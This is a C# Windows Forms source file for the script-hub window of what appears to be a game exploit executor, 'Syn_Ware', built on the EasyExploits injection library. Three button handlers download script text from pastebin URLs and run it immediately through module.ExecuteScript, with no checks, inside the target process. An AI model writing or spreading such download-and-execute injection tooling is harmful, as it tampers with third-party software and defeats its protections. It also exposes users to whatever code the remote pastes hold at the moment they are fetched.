using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using EasyExploits;
namespace Syn_Ware
{
    public partial class ScriptHub : Form
    {
        EasyExploits.Module module = new Module();
        public ScriptHub()
        {
            InitializeComponent();
        }

        private void ScriptHub_Load(object sender, EventArgs e)
        {
            siticoneShadowForm1.SetShadowForm(this);
        }

        private void siticoneButton4_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private void siticoneButton1_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void siticoneButton2_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/fzQgv20F");
            module.ExecuteScript(Script);
        }

        private void siticoneButton3_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/aeTxtLG5");
            module.ExecuteScript(Script);
        }

        private void siticoneButton5_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/ENJR2t2S");
            module.ExecuteScript(Script);
        }
    }
}
